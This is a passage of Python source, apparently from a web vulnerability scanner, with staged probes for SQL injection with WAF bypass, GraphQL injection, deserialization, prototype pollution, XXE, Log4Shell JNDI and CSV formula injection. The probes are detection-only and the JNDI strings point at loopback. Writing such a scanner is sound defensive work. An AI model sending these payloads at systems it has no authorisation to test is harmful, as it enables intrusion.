                rec["verdict"] = "CONFIRMED"
                rec["winning"] = label
                rec["signals"].append({"variant": label, "family": fam,
                                       "snippet": snip})
                mark_confirmed(ctx, url, param, "sqli")
                break
            if differs(r, base, 0.97):
                rec["verdict"] = "SUSPECTED"
                rec["winning"] = label
                rec["signals"].append({"variant": label, "note": "block bypassed "
                                       "(non-block response, signal pending manual)"})
        if rec["verdict"] != "SAFE":
            records.append(rec)
    results = {"records": records, "stats": {"probes": spent, "budget": budget,
                                             "blocked_inputs": len(blocked)}}
    cp.mark(ck, results, summary="waf-shape %d probes" % spent)
    waf_shape_findings(F, results)
    ok("Stage M done: %d probes, %d record(s)" % (spent, len(records)))
    return results


def waf_shape_findings(F, results):
    for rec in results.get("records", []):
        ep = "%s [%s]" % (rec["url"], rec["param"])
        if rec.get("verdict") == "CONFIRMED":
            F.add("sqli_waf_bypassable", "WAF bypass ho gaya injection (%s)"
                  % rec.get("winning"), ep,
                  "Blocked payload %r ne encode-variant se signal diya: %s"
                  % (rec.get("blocked_payload"), json.dumps(rec.get("signals", []))[:300]),
                  evidence_ref="waf_bypass.json")
        elif rec.get("verdict") == "SUSPECTED":
            F.add("sqli_waf_bypassable", "WAF block bypass (manual confirm pending)",
                  ep, "Variant %s ne block-frame toda: %s"
                      % (rec.get("winning"), json.dumps(rec.get("signals", []))[:300]),
                  evidence_ref="waf_bypass.json")


def _gql_candidates(base_dir, conf):
    """P7 graphql_ops + P11 feedforward + known paths se GraphQL targets."""
    cands = []
    seen = set()

    def add(url):
        u = url.rstrip("/")
        if u not in seen:
            seen.add(u)
            cands.append(u)

    for d in (base_dir,):
        ja = load_json(os.path.join(d, "js", "js_analysis.json"), None)
        if isinstance(ja, dict):
            for u in (ja.get("assets") or [{}])[0].get("graphql_endpoints", []) \
                    if ja.get("assets") else []:
                add(u)
        ac = load_json(os.path.join(d, "access", "feedforward.json"), None)
        if isinstance(ac, dict):
            mapping = ac.get("mapping") if isinstance(ac.get("mapping"), dict) else ac
            gql = mapping.get("to_phase12_inject") or {}
            for u in (gql.get("graphql_endpoints") or []):
                add(u)
            for rec in (gql.get("inject_candidates") or []):
                if isinstance(rec, dict) and "graphql" in str(rec.get("url", "")):
                    add(rec["url"])
        gq = os.path.join(d, "js", "graphql_ops.txt")
        if os.path.exists(gq):
            for line in open(gq, errors="ignore"):
                u = line.strip().split()[0] if line.strip() else ""
                if u.startswith("http") and "graphql" in u.lower():
                    add(u)
    return cands[:int(conf.get("inject_gql_probes", 6)) or 6]


def graphql_inject(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage N: GraphQL string-arg injection + did-you-mean mining (query-only)."""
    ck = "stageN:gql-inject"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        gql_inject_findings(F, cached)
        ok("Stage N replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    if not conf.get("inject_allow_gql", True):
        return {"records": [], "stats": {"skipped": "inject_allow_gql=false"}}
    cands = _gql_candidates(ctx.get("base_dir", ""), conf) or \
        [t["url"].split("?")[0] for t in targets if "graphql" in t["url"].lower()][:4]
    records = []
    probes = 0
    cap = int(conf.get("inject_gql_probes", 6))
    for url in cands:
        if probes >= cap:
            break
        # discover field shape via error-mining: bogus query -> suggestion
        probe_bodies = [
            {"query": "{ __typename }"},                      # liveness (read-only)
            {"query": "{ user(id: \"'\") { id } }"},           # string-arg quote
            {"query": "{ user(id: 1-) { id } }"},              # numeric type-confusion
        ]
        rec = {"url": url, "verdict": "SAFE", "signals": []}
        for body in probe_bodies:
            if probes >= cap:
                break
            r = _gql_post(http, url, body)
            probes += 1
            if r is None or r.error:
                continue
            capture(ctx, url, "-", json.dumps(body)[:80], r, note="gql")
            txt = r.text[:2500]
            if body.get("query") == "{ __typename }":
                if r.status == 200 and "__typename" in txt:
                    rec["signals"].append({"liveness": "graphql-live"})
                continue
            hit, snip = match_sql_error(txt)
            sug = re.search(r"[Dd]id you mean [`\"]?([\w]+)[`\"]?\?", txt)
            if hit:
                rec["verdict"] = "CONFIRMED"
                rec["signals"].append({"style": "sql-error-through-gql",
                                       "family": hit, "snippet": snip})
                break
            if sug:
                rec["signals"].append({"style": "suggestion", "field": sug.group(1)})
                rec["verdict"] = "SUSPECTED" if rec["verdict"] == "SAFE" else rec["verdict"]
            if "Cannot query field" in txt or "Argument \"" in txt:
                rec["signals"].append({"style": "schema-error",
                                       "snippet": truncate(txt, 160)})
                rec["verdict"] = "SUSPECTED" if rec["verdict"] == "SAFE" else rec["verdict"]
        if rec["verdict"] != "SAFE" or any(s.get("liveness") for s in rec["signals"]):
            records.append(rec)
    results = {"records": records, "stats": {"probes": probes, "cap": cap}}
    cp.mark(ck, results, summary="gql-inject")
    gql_inject_findings(F, results)
    ok("Stage N done: %d probes, %d record(s)" % (probes, len(records)))
    return results


def gql_inject_findings(F, results):
    for rec in results.get("records", []):
        if rec.get("verdict") == "CONFIRMED":
            F.add("graphql_arg_injection", "GraphQL argument injection",
                  rec["url"], "Signals: %s" % json.dumps(rec.get("signals", []))[:320],
                  evidence_ref="gql_inject.json")
        elif rec.get("verdict") == "SUSPECTED":
            F.add("gql_error_disclosure", "GraphQL schema/error disclosure", rec["url"],
                  "Signals: %s" % json.dumps(rec.get("signals", []))[:320],
                  evidence_ref="gql_inject.json")


def deser_typeflip(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage O: type flips (p[]=, p[$op], json-in-string) + deser fingerprints.
    DETECTION ONLY - gadget payloads KABHI nahi."""
    ck = "stageO:deser"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        deser_findings(F, cached)
        ok("Stage O replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    if not conf.get("inject_allow_deser", True):
        return {"records": [], "stats": {"skipped": "inject_allow_deser=false"}}
    budget = int(conf.get("inject_deser_probes", 6))
    spent = 0
    records = []
    for t in targets[:10]:
        if spent >= budget:
            break
        url, param = t["url"], t["param"]
        base = baseline_endpoint(http, url, conf, cp, tag="o")
        if not base.get("ok"):
            continue
        rec = {"url": url, "param": param, "verdict": "SAFE", "signals": []}
        for label, value in (("array-flip", "[]"), ("object-flip", "[$ne]=x"),
                             ("json-in-string", '{"wasp":1}')):
            if spent >= budget:
                break
            if label == "object-flip":
                probe_url = _nosql_get_url(url, param, "$ne", "x")
            else:
                probe_url = set_param(url, param, value)
            r = _req(http, "GET", probe_url, allow_redirects=False)
            spent += 1
            if r is None or r.error:
                continue
            capture(ctx, url, param, label, r, note="deser")
            tag, snip = match_deser(r.text)
            if tag:
                rec["verdict"] = "CONFIRMED"
                rec["signals"].append({"flip": label, "fingerprint": tag,
                                       "snippet": snip})
                mark_confirmed(ctx, url, param, "deser")
                break
            if r.status and r.status >= 500 and differs(r, base, 0.9):
                rec["verdict"] = "SUSPECTED"
                rec["signals"].append({"flip": label, "status": r.status,
                                       "note": "5xx on type flip"})
        if rec["verdict"] != "SAFE":
            records.append(rec)
    results = {"records": records, "stats": {"probes": spent, "budget": budget}}
    cp.mark(ck, results, summary="deser %d probes" % spent)
    deser_findings(F, results)
    ok("Stage O done: %d probes, %d record(s)" % (spent, len(records)))
    return results


def deser_findings(F, results):
    for rec in results.get("records", []):
        ep = "%s [%s]" % (rec["url"], rec["param"])
        if rec.get("verdict") == "CONFIRMED":
            F.add("deser_hint", "Deserialization fingerprint (%s)"
                  % rec.get("signals", [{}])[0].get("fingerprint"), ep,
                  "Type-flip par deser error: %s (gadget payload NAHI bheja gaya - "
                  "manual/RoE-gated)" % json.dumps(rec.get("signals", []))[:300],
                  evidence_ref="deser_scan.json")
        elif rec.get("verdict") == "SUSPECTED":
            F.add("type_confusion_anomaly", "Type-confusion anomaly", ep,
                  "Signals: %s" % json.dumps(rec.get("signals", []))[:300],
                  evidence_ref="deser_scan.json")


# ===========================================================================
# v13 STAGES (S->W): header-inject, prototype pollution, XXE canary,
# EL/Log4Shell, CSV-formula - sab detection-only, checkpointed, budget-capped.
# ===========================================================================
HEADER_INJECT_POINTS = [
    ("X-Forwarded-For", "xff"),
    ("Referer", "referer"),
    ("User-Agent", "user-agent"),
]

PP_PARAM_HINTS = ("name", "user", "username", "obj", "object", "config",
                  "settings", "role", "profile", "options", "props", "body")

PP_ERROR_FINGERPRINTS = [
    (r"prototype", "pp-prototype-err"),
    (r"__proto__", "pp-dunder-err"),
    (r"pollut", "pp-pollution-err"),
]

XXE_PARAM_HINTS = ("xml", "doc", "data", "payload", "soap", "body", "request")

XXE_ERROR_FINGERPRINTS = [
    (r"DOCTYPE.*disallowed", "doctype-disallowed"),
    (r"entity.*not (resolved|declared)", "entity-unresolved"),
    (r"SAXParser|SAXParseException", "java-sax"),
    (r"SimpleXMLElement", "php-xml"),
    (r"lxml\.etree|xml\.sax|xml\.parsers", "python-xml"),
    (r"javax\.xml\.parsers", "java-xml"),
]

LOG4J_FINGERPRINTS = [
    (r"log4j", "log4j-error"),
    (r"jndi", "jndi-error"),
    (r"invalid ldap", "ldap-invalid"),
    (r"ldap.*refus", "ldap-refused"),
    (r"could not find server", "jndi-lookup-fail"),
]

LOG4SHELL_PAYLOADS = [
    # LOOPBACK-ONLY (127.0.0.1:1 = fail-fast) - koi external egress NAHI
    ("${jndi:ldap://127.0.0.1:1/wasp}", "jndi-loopback"),
    ("${${lower:j}ndi:ldap://127.0.0.1:1/wasp}", "jndi-obfuscated"),
    ("${jndi:dns://127.0.0.1/wasp}", "jndi-dns-loopback"),
]

CSV_PARAM_HINTS = ("col", "column", "field", "format", "export", "csv",
                   "report", "table", "grid", "view", "type", "delimiter",
                   "sheet", "dl", "download")

CSV_FORMULA_PAYLOADS = [
    (lambda mk: "=" + mk, "csv-eval"),
    (lambda mk: "+" + mk, "csv-plus"),
    (lambda mk: "@SUM(" + mk + ")", "csv-macro"),
]

EL_CONTROL = ("${7*7}", "{{7*7}}", "49")


def _append_q(url, k, v):
    """Existing query preserve karke naya param append karo."""
    sep = "&" if "?" in url else "?"
    return "%s%s%s=%s" % (url, sep, urllib.parse.quote(k, safe=""),
                          urllib.parse.quote(v, safe=""))


def _pick_targets(targets, pred, fallback_n):
    """Family-filtered targets, warna ranked fallback (budget discipline)."""
    picked = [t for t in targets if pred(t)]
    if not picked:
        picked = list(targets)[:fallback_n]
    return picked


def header_inject_scan(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage S (v13): header-point injection - SQL-error + echo fingerprints."""
    ck = "stageS:hdr"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        header_inject_findings(F, cached)
        ok("Stage S replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    if not conf.get("inject_allow_header_inject", True):
        return {"records": [], "stats": {"skipped": "inject_allow_header_inject=false"}}
    budget = int(conf.get("inject_header_probes", 10))
    spent = 0
    records = []
    hdr_targets = _pick_targets(
        targets, lambda t: "sqli" in (t.get("families") or []), 6)
    for t in hdr_targets:
        if spent >= budget:
            break
        url, param = t["url"], t["param"]
        base = baseline_endpoint(http, url, conf, cp, tag="s")
        if not base.get("ok"):
            continue
        rec = {"url": url, "param": param, "verdict": "SAFE", "signals": []}
        for hname, hlabel in HEADER_INJECT_POINTS:
            if spent >= budget:
                break
            r = _req(http, "GET", url, headers={hname: "'"})
            spent += 1
            if r is None or r.error:
                continue
            capture(ctx, url, param, "H:%s='" % hname, r, note="header-inject")
            txt = r.text
            db, snip = match_sql_error(txt)
            if db and db not in base.get("text_sample", ""):
                rec["verdict"] = "CONFIRMED"
                rec["signals"].append({"header": hname, "label": hlabel,
                                       "payload": "'", "db": db, "snippet": snip,
                                       "note": "header value DB tak pahuncha"})
                mark_confirmed(ctx, url, param, "sqli-header")
                break
            if "'" in txt and "'" not in base.get("text_sample", "") \
                    and rec["verdict"] == "SAFE":
                rec["verdict"] = "SUSPECTED"
                rec["signals"].append({"header": hname, "label": hlabel,
                                       "note": "header value echoed (log sink)"})
        if rec["verdict"] != "SAFE":
            records.append(rec)
    results = {"records": records, "stats": {"probes": spent, "budget": budget}}
    cp.mark(ck, results, summary="header-inject %d probes" % spent)
    header_inject_findings(F, results)
    ok("Stage S done: %d probes, %d record(s)" % (spent, len(records)))
    return results


def header_inject_findings(F, results):
    for rec in results.get("records", []):
        ep = "%s [header:%s]" % (rec["url"], rec["param"])
        if rec.get("verdict") == "CONFIRMED":
            F.add("sqli_header", "Header-based SQL injection (%s)"
                  % rec.get("signals", [{}])[0].get("header", "?"), ep,
                  "Header quote-probe DB error deta hai: %s"
                  % json.dumps(rec.get("signals", []))[:300],
                  evidence_ref="header_inject.json")
        elif rec.get("verdict") == "SUSPECTED":
            F.add("header_reflection", "Header value echoed (log sink)", ep,
                  "Signals: %s" % json.dumps(rec.get("signals", []))[:300],
                  evidence_ref="header_inject.json")


def proto_pollution_scan(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage T (v13): server-side prototype pollution (bracket GET + JSON)."""
    ck = "stageT:pp"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        proto_findings(F, cached)
        ok("Stage T replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    if not conf.get("inject_allow_proto", True):
        return {"records": [], "stats": {"skipped": "inject_allow_proto=false"}}
    budget = int(conf.get("inject_proto_probes", 6))
    spent = 0
    records = []
    mk = "wasp-pp-" + rand_str(4)
    pp_targets = _pick_targets(
        targets,
        lambda t: "/pp" in t["url"].split("?")[0]
        or t["param"].lower() in PP_PARAM_HINTS, 6)
    for t in pp_targets:
        if spent >= budget:
            break
        url, param = t["url"], t["param"]
        base = baseline_endpoint(http, url, conf, cp, tag="t")
        if not base.get("ok") or mk in base.get("text_sample", ""):
            continue
        rec = {"url": url, "param": "__proto__", "verdict": "SAFE", "signals": []}
        # form-1: GET bracket payload (query append - existing params preserve)
        r = _req(http, "GET", _append_q(url, "__proto__[waspPP]", mk),
                 allow_redirects=False)
        spent += 1
        if r is not None and not r.error:
            capture(ctx, url, "__proto__[waspPP]", mk, r, note="proto-get")
            if mk in r.text:
                rec["verdict"] = "CONFIRMED"
                rec["signals"].append({"form": "get-bracket", "merged_key": "waspPP",
                                       "marker": mk, "note": "server ne key merge "
                                       "karke echo kiya"})
                mark_confirmed(ctx, url, "__proto__", "proto")
            else:
                tag, fp = None, ""
                for rx, fpx in PP_ERROR_FINGERPRINTS:
                    if re.search(rx, r.text, re.I):
                        tag, fp = "SUSPECTED", fpx
                        break
                if tag and r.status >= 400:
                    rec["verdict"] = "SUSPECTED"
                    rec["signals"].append({"form": "get-bracket",
                                           "fingerprint": fp})
        # form-2: JSON body variant (api-style endpoints)
        if rec["verdict"] == "SAFE" and spent < budget:
            r2 = _ro_post(http, url, data=json.dumps({"__proto__": {"waspPP": mk}}),
                          headers={"Content-Type": "application/json"})
            spent += 1
            if r2 is not None and not r2.error:
                capture(ctx, url, "__proto__[waspPP]", mk, r2, note="proto-json")
                if mk in r2.text:
                    rec["verdict"] = "CONFIRMED"
                    rec["signals"].append({"form": "json-body", "merged_key": "waspPP",
                                           "marker": mk})
                    mark_confirmed(ctx, url, "__proto__", "proto")
        if rec["verdict"] != "SAFE":
            records.append(rec)
    results = {"records": records, "stats": {"probes": spent, "budget": budget,
                                             "marker": mk}}
    cp.mark(ck, results, summary="proto %d probes" % spent)
    proto_findings(F, results)
    ok("Stage T done: %d probes, %d record(s)" % (spent, len(records)))
    return results


def proto_findings(F, results):
    for rec in results.get("records", []):
        ep = "%s [%s]" % (rec["url"], rec["param"])
        if rec.get("verdict") == "CONFIRMED":
            F.add("prototype_pollution", "Server-side prototype pollution (%s)"
                  % rec.get("signals", [{}])[0].get("form", "?"), ep,
                  "Merged-key echo proof: %s (gadget chain P20/manual - "
                  "yahan sirf merge)" % json.dumps(rec.get("signals", []))[:300],
                  evidence_ref="proto_pollution.json")
        elif rec.get("verdict") == "SUSPECTED":
            F.add("proto_anomaly", "Prototype-pollution error fingerprint", ep,
                  "Signals: %s" % json.dumps(rec.get("signals", []))[:300],
                  evidence_ref="proto_pollution.json")


def xxe_canary_scan(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage U (v13): internal-entity XXE canary (external/file read KABHI nahi)."""
    ck = "stageU:xxe"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        xxe_findings(F, cached)
        ok("Stage U replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    if not conf.get("inject_allow_xxe", True):
        return {"records": [], "stats": {"skipped": "inject_allow_xxe=false"}}
    budget = int(conf.get("inject_xxe_probes", 4))
    spent = 0
    records = []
    mk = "wasp-xxe-ok-" + rand_str(4)
    xxe_targets = _pick_targets(
        targets,
        lambda t: "/xml" in t["url"].split("?")[0]
        or t["param"].lower() in XXE_PARAM_HINTS, 3)
    for t in xxe_targets:
        if spent >= budget:
            break
        url, param = t["url"], t["param"]
        base = baseline_endpoint(http, url, conf, cp, tag="u")
        if not base.get("ok") or mk in base.get("text_sample", ""):
            continue
        payload = ('<?xml version="1.0" encoding="UTF-8"?>'
                   '<!DOCTYPE wasp [<!ENTITY waspE "%s">]>'
                   "<wasp><q>&waspE;</q></wasp>" % mk)
        r = _ro_post(http, url, data=payload,
                     headers={"Content-Type": "application/xml"})
        spent += 1
        rec = {"url": url, "param": "xml-body", "verdict": "SAFE", "signals": []}
        if r is None or r.error:
            continue
        capture(ctx, url, "xml-body", "ENTITY-waspE", r, note="xxe-canary")
        txt = r.text
        if mk in txt:
            rec["verdict"] = "CONFIRMED"
            rec["signals"].append({"canary": mk, "note": "internal entity RESOLVED "
                                   "echo hua - parser entity-processing ON "
                                   "(external/file XXE P15, RoE-gated)"})
            mark_confirmed(ctx, url, "xml-body", "xxe")
        elif "&waspE;" in txt:
            rec["verdict"] = "SUSPECTED"
            rec["signals"].append({"note": "entity reference verbatim echo - "
                                   "parser raw echo kar raha hai"})
        else:
            for rx, fpx in XXE_ERROR_FINGERPRINTS:
                if re.search(rx, txt, re.I):
                    rec["verdict"] = "SUSPECTED"
                    rec["signals"].append({"fingerprint": fpx})
                    break
        if rec["verdict"] != "SAFE":
            records.append(rec)
    results = {"records": records, "stats": {"probes": spent, "budget": budget}}
    cp.mark(ck, results, summary="xxe-canary %d probes" % spent)
    xxe_findings(F, results)
    ok("Stage U done: %d probes, %d record(s)" % (spent, len(records)))
    return results


def xxe_findings(F, results):
    for rec in results.get("records", []):
        ep = "%s [%s]" % (rec["url"], rec["param"])
        if rec.get("verdict") == "CONFIRMED":
            F.add("xxe_entity_processing", "XXE: entity processing live", ep,
                  "Internal-entity canary resolved hua: %s (external entity / "
                  "file read NAHI kiya - P15 manual, RoE-gated)"
                  % json.dumps(rec.get("signals", []))[:300],
                  evidence_ref="xxe_canary.json")
        elif rec.get("verdict") == "SUSPECTED":
            F.add("xxe_parser_hint", "XML parser fingerprint", ep,
                  "Signals: %s" % json.dumps(rec.get("signals", []))[:300],
                  evidence_ref="xxe_canary.json")


def el_log4shell_scan(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage V (v13): EL engine refine (control-pair) + Log4Shell jndi (GATED)."""
    ck = "stageV:el"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        el_findings(F, cached)
        ok("Stage V replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    budget = int(conf.get("inject_el_probes", 6))
    spent = 0
    records = []
    # ---- Part 1: EL engine refine ({{7*7}} vs ${7*7} control pair) ----
    if conf.get("inject_allow_el", True):
        el_targets = [t for t in targets if "ssti" in (t.get("families") or [])][:4]
        for t in el_targets:
            if spent >= budget:
                break
            url, param = t["url"], t["param"]
            base = baseline_endpoint(http, url, conf, cp, tag="v")
            if not base.get("ok") or "49" in base.get("text_sample", ""):
                continue
            orig = get_param_value(url, param)
            d_pay, c_pay, expect = EL_CONTROL
            rd = _req(http, "GET", set_param(url, param,
                        (orig + d_pay) if orig and len(orig) <= 24 else d_pay),
                      allow_redirects=False)
            spent += 1
            if rd is None or rd.error:
                continue
            capture(ctx, url, param, d_pay, rd, note="el-refine")
            if expect not in rd.text:
                continue
            rc = _req(http, "GET", set_param(url, param,
                        (orig + c_pay) if orig and len(orig) <= 24 else c_pay),
                      allow_redirects=False)
            spent += 1
            c_rendered = rc is not None and not rc.error and expect in rc.text
            if c_rendered:
                verdict, engine = "SUSPECTED", "mixed-engine"
            else:
                verdict, engine = "CONFIRMED", "java-el/spel"
            rec = {"url": url, "param": param, "verdict": verdict,
                   "signals": [{"kind": "el", "engine": engine,
                                "payload": d_pay, "rendered": expect,
                                "control": c_pay, "control_rendered": c_rendered}]}
            records.append(rec)
            if verdict == "CONFIRMED":
                mark_confirmed(ctx, url, param, "el")
    # ---- Part 2: Log4Shell jndi probes (DEFAULT OFF, loopback-only) ----
    l4 = {"records": [], "probes": 0}
    if conf.get("inject_allow_log4shell", False):
        l4_budget = int(conf.get("inject_log4shell_probes", 4))
        l4_targets = _pick_targets(
            targets,
            lambda t: "/log" in t["url"].split("?")[0]
            or "cmdi" in (t.get("families") or []), 4)
        # path-hint targets pehle (explicit /log endpoints), cmdi-family baad me
        l4_targets.sort(key=lambda t: 0 if "/log" in t["url"].split("?")[0] else 1)
        for t in l4_targets:
            if l4["probes"] >= l4_budget:
                break
            url, param = t["url"], t["param"]
            base = baseline_endpoint(http, url, conf, cp, tag="v2")
            if not base.get("ok"):
                continue
            for payload, label in LOG4SHELL_PAYLOADS:
                if l4["probes"] >= l4_budget:
                    break
                r = _req(http, "GET", set_param(url, param, payload),
                         headers={"User-Agent": payload}, allow_redirects=False)
                l4["probes"] += 1
                if r is None or r.error:
                    continue
                capture(ctx, url, param, payload, r, note="log4shell")
                txt = r.text
                fp = None
                for rx, fpx in LOG4J_FINGERPRINTS:
                    if re.search(rx, txt, re.I) and rx not in base.get("text_sample", ""):
                        fp = fpx
                        break
                if fp:
                    l4["records"].append({"url": url, "param": param,
                                          "verdict": "CONFIRMED",
                                          "signals": [{"kind": "log4shell",
                                                       "fingerprint": fp,
                                                       "payload": payload,
                                                       "label": label,
                                                       "note": "JNDI lookup "
                                                       "fingerprint (loopback-only "
                                                       "probe)"}]})
                    mark_confirmed(ctx, url, param, "log4shell")
                    break
                if payload in txt:
                    l4["records"].append({"url": url, "param": param,
                                          "verdict": "SUSPECTED",
                                          "signals": [{"kind": "log-echo",
                                                       "note": "jndi payload verbatim "
                                                       "echo (log injection vector)"}]})
                    break
    results = {"records": records + l4["records"],
               "stats": {"probes": spent, "budget": budget,
                         "log4shell_probes": l4["probes"],
                         "log4shell_enabled": bool(conf.get("inject_allow_log4shell", False))}}
    cp.mark(ck, results, summary="el/l4s %d+%d probes" % (spent, l4["probes"]))
    el_findings(F, results)
    ok("Stage V done: el=%d l4s=%d probes, %d record(s)"
       % (spent, l4["probes"], len(records)))
    return results


def el_findings(F, results):
    for rec in results.get("records", []):
        ep = "%s [%s]" % (rec["url"], rec["param"])
        kinds = [s.get("kind") for s in rec.get("signals", [])]
        if rec.get("verdict") == "CONFIRMED" and "el" in kinds:
            F.add("el_injection", "Expression-Language injection (%s)"
                  % rec.get("signals", [{}])[0].get("engine", "?"), ep,
                  "Control-pair proof: ${7*7}=49, {{7*7}} literal - dollar-"
                  "evaluator live: %s" % json.dumps(rec.get("signals", []))[:300],
                  evidence_ref="el_log4shell.json")
        elif rec.get("verdict") == "CONFIRMED" and "log4shell" in kinds:
            F.add("log4shell_indicator", "Log4Shell JNDI fingerprint", ep,
                  "Loopback-only jndi probe se lookup fingerprint: %s "
                  "(stage default OFF - RoE-gated)"
                  % json.dumps(rec.get("signals", []))[:300],
                  evidence_ref="el_log4shell.json")
        elif rec.get("verdict") == "SUSPECTED" and "log-echo" in kinds:
            F.add("log_injection_reflected", "Log payload verbatim echo", ep,
                  "jndi string response me reflect - forged-log vector",
                  evidence_ref="el_log4shell.json")


def csv_inject_scan(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage W (v13): CSV/formula injection - unescaped cell reflection."""
    ck = "stageW:csv"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        csv_findings(F, cached)
        ok("Stage W replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    if not conf.get("inject_allow_csv", True):
        return {"records": [], "stats": {"skipped": "inject_allow_csv=false"}}
    budget = int(conf.get("inject_csv_probes", 5))
    spent = 0
    records = []
    mk = "wasp-csv-" + rand_str(4)
    csv_targets = _pick_targets(
        targets,
        lambda t: t["param"].lower() in CSV_PARAM_HINTS
        or re.search(r"(csv|export|report)", t["url"].split("?")[0], re.I),
        4)
    for t in csv_targets:
        if spent >= budget:
            break
        url, param = t["url"], t["param"]
        base = baseline_endpoint(http, url, conf, cp, tag="w")
        if not base.get("ok") or mk in base.get("text_sample", ""):
            continue
        rec = {"url": url, "param": param, "verdict": "SAFE", "signals": []}
        for builder, label in CSV_FORMULA_PAYLOADS:
            if spent >= budget:
                break
            payload = builder(mk)
            r = _req(http, "GET", set_param(url, param, payload),
                     allow_redirects=False)
            spent += 1
            if r is None or r.error:
                continue
            capture(ctx, url, param, payload, r, note="csv-formula")
            if mk in r.text:
                ct = (r.header("Content-Type", "") or "").lower()
                csvish = ("csv" in ct or re.search(r"(^|[\r\n])[^,\r\n]*,[^,\r\n]*(\r?\n|$)",
                          r.text) or re.search(r"(csv|export|report)",
                          url.split("?")[0], re.I))
                rec["verdict"] = "CONFIRMED" if csvish else "SUSPECTED"
                rec["signals"].append({"payload": payload, "style": label,
                                       "content_type": ct,
                                       "note": "formula cell unescaped reflect - "
                                       "victim spreadsheet me execute hoga "
                                       "(stored chain P13/P20)"})
                mark_confirmed(ctx, url, param, "csv")
                break
        if rec["verdict"] != "SAFE":
            records.append(rec)
    results = {"records": records, "stats": {"probes": spent, "budget": budget}}
    cp.mark(ck, results, summary="csv %d probes" % spent)
    csv_findings(F, results)
    ok("Stage W done: %d probes, %d record(s)" % (spent, len(records)))
    return results


def csv_findings(F, results):
    for rec in results.get("records", []):
        ep = "%s [%s]" % (rec["url"], rec["param"])
        if rec.get("verdict") == "CONFIRMED":
            F.add("csv_formula_injection", "CSV formula injection", ep,
                  "Unescaped formula cell: %s (victim-side execution - apne "
                  "test rows par hi)" % json.dumps(rec.get("signals", []))[:300],
                  evidence_ref="csv_inject.json")
        elif rec.get("verdict") == "SUSPECTED":
            F.add("csv_reflection", "Formula payload reflect (context unclear)", ep,
                  "Signals: %s" % json.dumps(rec.get("signals", []))[:300],
                  evidence_ref="csv_inject.json")


# ---------------------------------------------------------------------------
# v13 FULL-DETAIL CATALOG (TECHNIQUES_CATALOG.md + cwe_owasp_map.json)
# ---------------------------------------------------------------------------
CWE_OWASP_MAP = {
    "sqli_error": {"cwe": "CWE-89", "owasp": "A03:2021-Injection"},
    "sqli_boolean": {"cwe": "CWE-89", "owasp": "A03:2021-Injection"},
    "sqli_time": {"cwe": "CWE-89", "owasp": "A03:2021-Injection"},
    "sqli_header": {"cwe": "CWE-89", "owasp": "A03:2021-Injection"},
    "sqli_waf_bypassable": {"cwe": "CWE-89", "owasp": "A03:2021-Injection"},
    "sql_error_disclosure": {"cwe": "CWE-209", "owasp": "A05:2021-Security Misconfiguration"},
    "nosql_injection": {"cwe": "CWE-943", "owasp": "A03:2021-Injection"},
    "ssti_detected": {"cwe": "CWE-1336", "owasp": "A03:2021-Injection"},
    "ssti_possible": {"cwe": "CWE-1336", "owasp": "A03:2021-Injection"},
    "cmdi_detected": {"cwe": "CWE-78", "owasp": "A03:2021-Injection"},
    "cmdi_blind_time": {"cwe": "CWE-78", "owasp": "A03:2021-Injection"},
    "path_traversal_confirmed": {"cwe": "CWE-22", "owasp": "A01:2021-Broken Access Control"},
    "traversal_waf_bypass": {"cwe": "CWE-22", "owasp": "A01:2021-Broken Access Control"},
    "open_redirect_confirmed": {"cwe": "CWE-601", "owasp": "A01:2021-Broken Access Control"},
    "redirect_client_hint": {"cwe": "CWE-601", "owasp": "A01:2021-Broken Access Control"},
    "crlf_header_injection": {"cwe": "CWE-113", "owasp": "A03:2021-Injection"},
    "hpp_anomaly": {"cwe": "CWE-235", "owasp": "A03:2021-Injection"},
    "waf_detected": {"cwe": "CWE-1019", "owasp": "A05:2021-Security Misconfiguration"},
    "sqli_waf_blocked": {"cwe": "CWE-89", "owasp": "A03:2021-Injection"},
    "deser_hint": {"cwe": "CWE-502", "owasp": "A08:2021-Software and Data Integrity Failures"},
    "type_confusion_anomaly": {"cwe": "CWE-843", "owasp": "A03:2021-Injection"},
    "gql_error_disclosure": {"cwe": "CWE-209", "owasp": "A05:2021-Security Misconfiguration"},
    "gql_introspection_live": {"cwe": "CWE-200", "owasp": "A01:2021-Broken Access Control"},
    "reflection_xss_ripe": {"cwe": "CWE-79", "owasp": "A03:2021-Injection"},
    "header_reflection": {"cwe": "CWE-117", "owasp": "A09:2021-Security Logging and Monitoring Failures"},
    "prototype_pollution": {"cwe": "CWE-1321", "owasp": "A03:2021-Injection"},
    "proto_anomaly": {"cwe": "CWE-1321", "owasp": "A03:2021-Injection"},
    "xxe_entity_processing": {"cwe": "CWE-611", "owasp": "A05:2021-Security Misconfiguration"},
    "xxe_parser_hint": {"cwe": "CWE-611", "owasp": "A05:2021-Security Misconfiguration"},
    "el_injection": {"cwe": "CWE-917", "owasp": "A03:2021-Injection"},
    "log4shell_indicator": {"cwe": "CWE-917", "owasp": "A06:2021-Vulnerable and Outdated Components"},
    "log_injection_reflected": {"cwe": "CWE-117", "owasp": "A09:2021-Security Logging and Monitoring Failures"},
    "csv_formula_injection": {"cwe": "CWE-1236", "owasp": "A03:2021-Injection"},
